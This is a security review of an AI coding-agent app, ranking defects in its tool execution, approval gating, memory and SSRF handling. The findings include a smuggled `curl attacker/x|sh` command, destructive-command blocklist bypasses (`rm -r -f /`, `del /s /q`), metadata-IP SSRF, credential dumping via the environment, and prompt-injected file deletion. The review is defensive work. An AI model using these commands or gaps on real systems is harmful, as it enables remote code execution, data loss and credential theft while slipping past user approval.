# CoderAI — Critical Review (consolidated)

Date: 2026-09-16
Scope: full codebase after fast-forward to `mohamadreza1368/CoderAI` HEAD (`cb6c375`).
Method: 4 parallel adversarial review agents (execution/security, code-graph/context,
memory/RAG, server/state/auth) + direct diagnosis. Every item below is ranked by
severity. Items marked ✅ were found to be quick, high-confidence defects and were
**fixed in this pass**; the rest is the prioritized backlog for decision.

---

## ✅ Already fixed in this pass (uncommitted on `main`)

These were quick, verified, and low-risk. They are the only working-tree changes.

| # | File | Fix |
|---|------|-----|
| F1 | `tools.py` | **De-corruption.** The two "advanced tools" commits (`3f47a82`, `cb6c375`) had scattered 12 `_HANDLERS` entries into the file header (before the docstring and mid-imports), mangled `import subprocess` with a trailing backslash, garbled `import advanced_tools` to `nimport advanced_tools\n`, and spliced 12 `TOOL_SCHEMAS` entries into the middle of an f-string in `tool_read_file`. Result: `tools.py` raised `SyntaxError` at line 2 and **could not be imported** — the entire tool layer (and thus the app's ability to act) was dead. Rebuilt from the known-good parent `202a910`, placing the 12 schemas + 12 handlers + import in their correct locations. Verified: 44/44 schemas↔handlers paired, all 57 `.py` parse, module imports. |
| F2 | `advanced_tools.py` | Line 106 was a literal two-character `\n` (backslash-n) instead of a blank line — same corruption pattern. Fixed to a real blank line. |
| F3 | `tools.py` | `tool_replace_in_file` referenced an **undefined `manager`** (NameError) on the approval path, so the tool could not succeed under the default policy. Added `manager = GitManager(ws)` mirroring `tool_write_file`. |
| F4 | `tools.py` | `replace_in_file` with `count=0` (the default, documented as "replace all") actually replaced **nothing** because `str.replace(..., 0)` is a no-op. Mapped `0 → -1` for true replace-all. |
| F5 | `context_builder.py` | `extract_code_outline`'s regex fallback dropped functions with a **return annotation** (`def f(x) -> int:`) and did not strip parameter annotations. Added `_strip_python_type_hints` + a depth-aware `_split_top_level` helper and broadened the `def` regex. Now matches plain parameter names. |
| F6 | `web_app.py` | When the custom-API model **listing is offline/fails**, `_available_models` fell back to a hardcoded generic list (`gpt-4o-mini`, …) that likely doesn't exist on the configured vendor. Now it shows the configured custom model. |

Verification: all 57 `.py` parse; the two previously-failing tests
(`test_leanctx_compression.py::test_extract_code_outline_python`,
`test_custom_api_model.py::test_custom_model_remains_available_when_model_listing_fails`) pass.

---

## 🔴 P0 — highest impact, fix next

1. **Advanced tools run model-controlled strings via `shell=True` with NO approval.**
   `advanced_tools.py:77-162` — `run_linter`, `run_tests`, `run_kubectl`, `run_terraform`,
   `run_npm_script`, `run_docker_container`, `get_container_logs` build `f"… {command}"`
   and call `subprocess.run(cmd, shell=True)`. None are in `approval_policy.DEFAULT_GLOBAL_POLICY`
   and `should_require_approval` has no branch for them → zero gating.
   Concrete: `run_linter(command="flake8 .; curl attacker/x|sh")`.
   Fix: route through the approval flow + pass args as lists (no `shell=True`).

2. **`execute_sql_query` runs arbitrary SQL over an arbitrary (possibly remote) connection, no approval.**
   `advanced_tools.py:23-39`. Model supplies both the connection string and the query;
   non-SELECT statements are committed. Concrete: a `postgresql://prod@…` connection string.
   Fix: restrict to a workspace-local SQLite path (via `_safe_path`), block remote schemes,
   require approval for writes.

3. **Approval state is keyed by tool *name* only, not arguments — one approval authorizes any later call of that tool, and races under concurrency.**
   `tools.py:149-210`. A single module-global `_approval_state`; approving overwrite of `a.txt`
   lets the next `write_file` (even for `b.txt` / `.git/config`) run without a prompt. Same for
   `run_bash` (approve `ls` → next `run_bash` runs anything). No correlation id → thread race.
   Fix: per-request token = hash(tool_name + arguments); UI approve/reject carries it.

4. **`delete_file` and `append_file` require no approval even though `write_file`/`replace_in_file` do.**
   `approval_policy.py:19-26`. A prompt-injected model can silently `delete_file`
   `package.json` or `append_file` a malicious `requirements.txt` line → `pip install -r …` picks it up.
   Fix: add both to the policy and approval branches (append is a write).

5. **`query_code_graph` is 100% non-functional — the advertised patterns don't exist in CRG.**
   `tools.py:729-747` advertises `pattern ∈ {calls, callers, imports, dependencies, extended_by}`;
   `code_graph_service.py:208-243` passes it straight through with no mapping. All 5 advertised
   values error (`Unknown pattern 'calls'`); only the real `*_of` names work. The capability is
   dead on every call. Fix: map advertised → CRG names (`calls→callees_of`, `callers→callers_of`,
   `imports→imports_of`, `dependencies→importers_of`, `extended_by→inheritors_of`).

6. **Hindsight offline "local fallback" is dead code; `remember_fact` falsely reports success.**
   `hindsight_manager.py:149,203,245` — all three fallbacks do
   `from memory_manager import get_memory_manager`, which does not exist → `ImportError`,
   swallowed. Offline `retain()` returns `error`, but `tool_remember_fact` claims
   "Retained in local memory store". The "private long-term memory" moat writes nothing offline.
   Fix: point the fallback at `MemoryManager(ws).index_fact(…)` and surface `status=="error"`.

---

## 🟠 P1

7. **`fetch_url` SSRF: the gate never resolves DNS, so any hostname resolving to a private/metadata IP passes.**
   `tools.py:1243-1278`. Only checks scheme + whether the hostname *string* is localhost/literal private IP.
   Concrete (verified): `http://localtest.me/` → `127.0.0.1` passes; DNS-rebind or a `302` to
   `169.254.169.254` reaches the cloud metadata service. (IP-literal obfuscation does **not** work on
   CPython 3.13 — the live vector is DNS names + redirect.) Fix: `getaddrinfo`, reject private/loopback/
   link-local/metadata IPs, pin the connection.

8. **`terminal_manager` does not clamp `cwd` to the workspace.** `terminal_manager.py:42`. A session can be
   anchored at `C:\Windows\System32` or the user profile, then `execute("del /s /q …")` runs there — a full
   user-RCE surface anywhere on disk. Fix: `relative_to` the active workspace.

9. **`run_bash`/`run_python` fall back to plain local `shell=True` when Docker is absent** (the default on a
   Windows dev box). `approval_policy.py:22-23`, `sandbox_runner.py:67-74`. Effective guard is only the
   narrow destructive-command regex (#12). Fix: require approval whenever `used_sandbox == "local"`.

10. **`recall_memory` can never see locally-stored facts.** `hindsight_manager.py:201-217` — offline recall
    dies on the same dead import as #6, returns count 0, so the agent concludes "no memory exists" even though
    facts are written to `memory.db` by other paths. Fix: `MemoryManager(ws).retrieve_relevant(…)`.

11. **`context_builder.py:85` calls the `is_available` *property* as a *method*** → `TypeError`, swallowed by a
    broad `except`, so `extract_code_outline` **always** uses the crude regex fallback and never the tree-sitter
    parser. Fix: drop the `()` — `if code_graph_service.is_available:`.

12. **Destructive-command heuristic is a narrow regex blocklist, trivially bypassed; `dangerous_only` runs non-matches unprompted.**
    `tools.py:1114-1122`. `rm -r -f /`, `Remove-Item -Recurse -Force`, `del /s /q C:\` (no trailing `\`), and
    `powershell/python -c` bypasses all run with no approval. Fix: require approval for all non-read-only
    commands, or default `run_bash` to `always` outside a verified sandbox.

13. **Multi-turn tool context is discarded — the model never sees its own prior tool calls/results.**
    `web_app.py:1929,2050` append only `{"role":"assistant","content":…}` to `STATE["messages"]`; the
    intermediate `tool_calls`/`tool` messages are dropped. On turn N+1 the model must re-read everything.
    Fix: persist compact tool-call/result pairs (or a rolling tool-memory buffer).

14. **Unbounded response bodies read into memory before truncation.** `tools.py:1270-1275`,
    `advanced_tools.py:138-148`. `resp.read()` / `response.read()` with no size cap → a large endpoint OOMs the app.
    Fix: stream-read with a hard byte cap.

15. **`bank_id` collision leaks memory across unrelated workspaces.** `hindsight_manager.py:32-39` derives the
    bank from only the leaf directory name (`ws_app`), so `E:/projects/app` and `D:/work/app` share a bank.
    Fix: incorporate a hash of the full resolved path.

16. **Every `CodebaseIndex` call pays a synchronous Ollama network round-trip in the constructor, with no caching.**
    `codebase_index.py:111` → `LocalEmbeddingProvider.__init__` probes Ollama (`urlopen`, 3 s). Constructed fresh
    on every `search_codebase`/`get_related_files`/etc. (`tools.py`, `web_app.py`). Measured ~3.7 s offline per
    call, plus a re-opened chroma client each time. Fix: cache one `CodebaseIndex` per workspace; lazy probe.

17. **`run_bash`/`run_python` env leak to the model subprocess.** `tools.py:1124-1151` — denylist removes only 11
    keys; `AWS_ACCESS_KEY_ID`/`AWS_SESSION_TOKEN`, `NPM_TOKEN`, `GCP_*`, etc. are passed through and dumpable via
    `run_bash("set")`. Fix: allowlist, or at least add the AWS token keys.

18. **Every `write_file`/`replace_in_file` silently auto-commits to git, independent of the approval decision.**
    `tools.py:1074-1078,1404-1408`. A commit is created as a side effect the user didn't approve. Fix: make
    auto-commit opt-in / part of the approval decision.

---

## 🟡 P2

19. **`_safe_path` TOCTOU + no symlink/junction containment at write time** (`tools.py:950-957`). Re-resolve +
    re-assert containment at write/unlink; treat symlinks pointing outside as errors.
20. **`_build_api_messages` has no hard window cap and stacks up to 3 system prompts** (`web_app.py:967-1025`).
    Real token estimate; evict/clip oldest non-system or memory blocks over budget; merge extra system blocks.
21. **Auto-continue is over-triggered → repeated/duplicated generation** (`web_app.py:1589-1619`, cap 8). Gate on
    `finish_reason == length` as the primary signal; require an actually-unclosed fence.
22. **`extract_fallback_tool_calls_from_text` can fabricate a tool from prose** (`tool_parser.py:141-150`). Require
    the arguments body to parse to a real JSON object before treating it as a call.
23. **Per-request `CodebaseIndex` re-instantiation on the hot path + wasted retrieval** (`web_app.py:563-580`) —
    see #16.
24. **Skill "applied" accounting depends on the model echoing the skill, not on actual use** (`web_app.py:384`).
25. **Ollama local-mode history drops `tool_call_id`/`type`** — order-dependent pairing is fragile on multi-call turns.
26. **Unbounded growth: turns, graph episodes, audit log append forever** (`memory_manager.py`, `memory_graph.py`).
27. **Overlapping Python chunks (class + every nested method)** inflate/duplicate recall (`syntax_chunker.py:97-114`).
28. **Embedding outage at index time leaves chunks with NULL vector, never backfilled** (`codebase_index.py:801-811`).
29. **`ingest_turn_async` spawns an unbounded daemon thread per turn and swallows all errors** (`memory_graph.py:488-508`).
30. **Binary files with a text extension get `errors="replace"`-mangled into the index** (`codebase_index.py:204-211`).

---

## Verified non-issues (so they aren't re-raised)

- `_safe_path` **does** correctly reject `..`, absolute, and cross-drive paths (tested).
- The obfuscated-IP-literal SSRF trick (`2130706433`, `0x7f000001`) does **not** work on CPython 3.13 — `getaddrinfo`
  rejects those forms. The real SSRF is the missing DNS-resolution check (#7), not IP-literal obfuscation.
- `tool_fetch_url` **does** cap the returned `max_chars` (it fails to cap the *read*, #14).
- Persistence integrity is sound: all three SQLite DBs use WAL + `busy_timeout` with per-op connect/commit/rollback;
  concurrent chroma `upsert` does not corrupt.
- The `code-graph` engine itself is functional (live build parsed 2 files / 5 nodes / 6 edges); the dead path is the
  pattern mapping (#5) and the `is_available()` call (#11), not the engine.
- The `api_messages[-1] = {user}` override in `web_app.py` is safe.
- `MAX_ITERATIONS=10` loop cannot run unbounded (auto-continue separately capped at 8).

## Recommended order of attack

1. P0 #1–#4 (security: unapproved RCE / SQL / approval-keying) — same area, one cohesive approval-policy pass.
2. P0 #5, #6 (dead advertised capability + broken offline memory) — quick, high payoff, unblock features.
3. P1 #7, #8, #9, #12 (escapes & sandbox fallback).
4. P1 #13 (tool context persistence) — the most consequential architectural context defect.
5. P1 #16 / P2 #23 (CodebaseIndex caching) — the "thinking…" stall.
